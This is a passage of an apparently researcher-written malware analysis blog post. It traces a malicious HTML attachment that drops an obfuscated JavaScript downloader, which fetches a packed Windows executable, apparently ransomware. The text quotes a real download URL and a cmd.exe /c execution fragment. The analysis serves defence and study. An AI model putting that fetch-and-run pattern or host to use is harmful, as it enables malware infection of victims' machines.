/&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-H18UjMavfCs/WJ682bu5B8I/AAAAAAAANzA/pOrYRpR-8mwL55NNufn378BAZmmK3W0nACLcB/s1600/Schermata%2B2017-02-11%2Balle%2B08.27.07.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;48&#34; src=&#34;https://4.bp.blogspot.com/-H18UjMavfCs/WJ682bu5B8I/AAAAAAAANzA/pOrYRpR-8mwL55NNufn378BAZmmK3W0nACLcB/s400/Schermata%2B2017-02-11%2Balle%2B08.27.07.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure3: Clear Text First Stage&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;That script is going to create an additional &#34;script tag&#34; on the current document by injecting an external script from: &#34;&lt;span style=&#34;background-color: whitesmoke; color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;https://s3-us-west-2.amazonaws.com/s.cdpn.io/14082/FileSaver.js&lt;/span&gt;&#34;. The injected script will be called with the following code signature: &#34;&lt;span style=&#34;background-color: whitesmoke; color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;saveAs(blob, &#39;image.js&#39;);&lt;/span&gt;&#34; with 2 arguments:&amp;nbsp;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;/div&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;blob&lt;/b&gt;. The raw content of &#34;big_encoded_data&#34; (please refer to Figure3)&lt;/li&gt;&lt;li&gt;&lt;b&gt;image.js&lt;/b&gt;. The saving name&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;In order to better understand what that function saveAs(blob, image.js) does we need to analyze the external FileServer.js. The entry point of the external script is the function &#34;saveAs(arg1, arg2)&#34; which has been defined as follows:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-MecHnPmKeAM/WJ6-RJ_L3FI/AAAAAAAANzQ/Wp_-sNDpIzYc-To9vryqwwfT8Q4VjdznwCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B08.32.01.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;82&#34; src=&#34;https://4.bp.blogspot.com/-MecHnPmKeAM/WJ6-RJ_L3FI/AAAAAAAANzQ/Wp_-sNDpIzYc-To9vryqwwfT8Q4VjdznwCLcB/s400/Schermata%2B2017-02-11%2Balle%2B08.32.01.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure4: FileServer.js Original Entry&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: center;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: left;&#34;&gt;saveAs(blob, name) is a simple wrapper function headed to FileServer constructor which is defined as follows:&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-Q1m1FRBLcwA/WJ6_Wc0RpHI/AAAAAAAANzc/hkX357K8_VYzRyzavpolePTBOk9t6dsHwCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B08.37.35.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;391&#34; src=&#34;https://3.bp.blogspot.com/-Q1m1FRBLcwA/WJ6_Wc0RpHI/AAAAAAAANzc/hkX357K8_VYzRyzavpolePTBOk9t6dsHwCLcB/s400/Schermata%2B2017-02-11%2Balle%2B08.37.35.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure5: FileServer.js constructor&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;The script saves the &#34;blob&#34; content to the temporary folder giving to it a specific name (image.js in our case). As you might notice from the script content: &#34;&lt;/span&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;Apple do not allow window.open, see http://bit.ly/1kZffRI &#34; if the victims opens the file with Safari/Mail the attack vector will have no effect since Safari/Mail does not allow you to trigger the script on &#34;window.open&#34; event. This is why I did&#39;t see any file when I opened the infected HTML content. Back to the original script (Figure3) we see the aveAs function called on page.load so the resulting image.js is going to be saved in the temporary local folder, in case of email clients, it will be triggered as soon as saved! So lets move on our next stage: the &lt;b&gt;big_encoded_data &lt;/b&gt;&lt;/span&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;variable&lt;/span&gt;&lt;b style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt; &lt;/b&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;(Figure3) which is going to be saved as image.js file. The big_encoded_data owns a first obfuscation stage made by encoding the downloader in base64. Once decoded from base64 and beautified the results looks like the following image&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-2SPGni1PqfU/WJ7N1MVEsEI/AAAAAAAANz0/o0t5FjKC0Q8hpdA3kRsOK4PyqtkgBGulQCLcB/s1600/Schermata%2B2017-02-10%2Balle%2B14.05.37.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;357&#34; src=&#34;https://1.bp.blogspot.com/-2SPGni1PqfU/WJ7N1MVEsEI/AAAAAAAANz0/o0t5FjKC0Q8hpdA3kRsOK4PyqtkgBGulQCLcB/s400/Schermata%2B2017-02-10%2Balle%2B14.05.37.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure6: Stage 2 base64 decoded obfuscated downloader&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;The downloader is still obfuscated by a high number of simple returning array-strings variables. It took almost 45 minutes to decode the entire second stage downloader. The resulting downloader is shown in the following image.&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-QhHB1SxCjpM/WJ7Pn0hpPZI/AAAAAAAAN0E/MchDmzAX-Zgr7A4KjXsPtKf2-5yF3VeSwCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B09.47.10.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;207&#34; src=&#34;https://4.bp.blogspot.com/-QhHB1SxCjpM/WJ7Pn0hpPZI/AAAAAAAAN0E/MchDmzAX-Zgr7A4KjXsPtKf2-5yF3VeSwCLcB/s400/Schermata%2B2017-02-11%2Balle%2B09.47.10.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure7: Second Stage Downloader&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;A first check on fileSystem API and on the Element Type is super interesting (at least to me). We are analyzing an attack based on a specific file system, Windows native. The deobfuscated downloader grabs a file from  &lt;/span&gt;&lt;span style=&#34;background-color: #eeeeee; color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&#34;http://mit.fileserver4390.org/file/nost.bgt&#34; &lt;/span&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;and saves it to a temporary directory. By using &lt;b&gt;ActiveXObject &lt;/b&gt;(Windows native) it saves the file and it runs it through command line &lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;background-color: whitesmoke; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;str&#34; style=&#34;background-color: whitesmoke; color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&#34;run&#34;&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;str&#34; style=&#34;background-color: whitesmoke; color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&#34;cmd.exe /c &#34;&lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;background-color: whitesmoke; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt; &lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;background-color: whitesmoke; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt; f &lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;background-color: whitesmoke; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt; g&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;background-color: whitesmoke; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt; &lt;/span&gt;&lt;span class=&#34;str&#34; style=&#34;background-color: whitesmoke; color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&#34;0&#34;&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;); &lt;/span&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;where f takes the temporary folder&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;f &lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt; b&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;str&#34; style=&#34;color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&#34;GetSpecialFolder&#34;&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;str&#34; style=&#34;color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;); &lt;/span&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;and g takes the temporary name &lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;background-color: whitesmoke; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;g &lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;pln&#34; style=&#34;background-color: whitesmoke; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt; b&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;str&#34; style=&#34;background-color: whitesmoke; color: #008800; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&#34;GetTempName&#34;&lt;/span&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;]();.&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span class=&#34;pun&#34; style=&#34;background-color: whitesmoke; color: #666600; font-family: &amp;quot;menlo&amp;quot; , &amp;quot;monaco&amp;quot; , &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace; font-size: 12.025px; text-align: left; white-space: pre-wrap;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;This is the end of the second &lt;/span&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;stage &lt;/span&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;downloader. &lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;The downloaded file is a PE Executable packed as well. Fortunately the used packer is the PiMP Stub by Nullsoft: a quite famous installer used by several software house. &lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-mrAARhlDQ9w/WJ7SKrIMIYI/AAAAAAAAN0U/jDRSolhqpU4k1iK6ePo98wGCHNSSVu0zACLcB/s1600/Schermata%2B2017-02-10%2Balle%2B14.02.24.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;180&#34; src=&#34;https://2.bp.blogspot.com/-mrAARhlDQ9w/WJ7SKrIMIYI/AAAAAAAAN0U/jDRSolhqpU4k1iK6ePo98wGCHNSSVu0zACLcB/s320/Schermata%2B2017-02-10%2Balle%2B14.02.24.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure8: NullSoft Installer&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left; white-space: pre-wrap;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;The PiMP installer takes .dlls and runs them as the resulting software. The used resources are compressed in its own body by a well known algorithm: .7zip. Kation.DLL is the only DLL included in the dropped file and so it is the run DLL by PiMP installer. Kation wraps out ADVAPI32.DLL and KERNEL32.DLL as you might see from Figure9. ADVAPI32 is a core Microsoft library which includes the Microsoft encryption libraries such as: EncryptFileA, EncryptFileW and so on and so forth. It&#39;s not hard to guess a new Ransomware infection from that API calls.&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-AjWyMjTK2es/WJ7W5YjcM5I/AAAAAAAAN0k/7b0xKAY3hbY9SnwHnGUpvnewhcx2YbggACLcB/s1600/Schermata%2B2017-02-11%2Balle%2B10.18.05.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;132&#34; src=&#34;https://2.bp.blogspot.com/-AjWyMjTK2es/WJ7W5YjcM5I/AAAAAAAAN0k/7b0xKAY3hbY9SnwHnGUpvnewhcx2YbggACLcB/s400/Schermata%2B2017-02-11%2Balle%2B10.18.05.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure9: Usage of Encryption Libraries&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;From a static analysis prospective it becomes clear that some of the used strings are dynamically allocated. For example in &lt;b&gt;sub_10001170&lt;/b&gt; (frame &lt;b&gt;0XBC&lt;/b&gt;) several UFT-16 strings within decryption loop are involved showing out the control flow passing to &lt;b&gt;Etymology.Vs &lt;/b&gt;(Figure11).&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-qksCBbndWUA/WJ8oEgBz1YI/AAAAAAAAN00/1NIRD1LP1b8JtfHRhcZlfKsA_rp9NRhuQCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B16.03.37.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;207&#34; src=&#34;https://2.bp.blogspot.com/-qksCBbndWUA/WJ8oEgBz1YI/AAAAAAAAN00/1NIRD1LP1b8JtfHRhcZlfKsA_rp9NRhuQCLcB/s400/Schermata%2B2017-02-11%2Balle%2B16.03.37.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure10: Setting the running pointer&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-eSXsZ4-86cs/WJ8s2v1nXyI/AAAAAAAAN1E/d8wacJ6CkQEnvVPMA05WQdtF8i5A-tmdQCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B16.24.49.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;367&#34; src=&#34;https://3.bp.blogspot.com/-eSXsZ4-86cs/WJ8s2v1nXyI/AAAAAAAAN1E/d8wacJ6CkQEnvVPMA05WQdtF8i5A-tmdQCLcB/s400/Schermata%2B2017-02-11%2Balle%2B16.24.49.png&#34; width=&#34;400&#34; 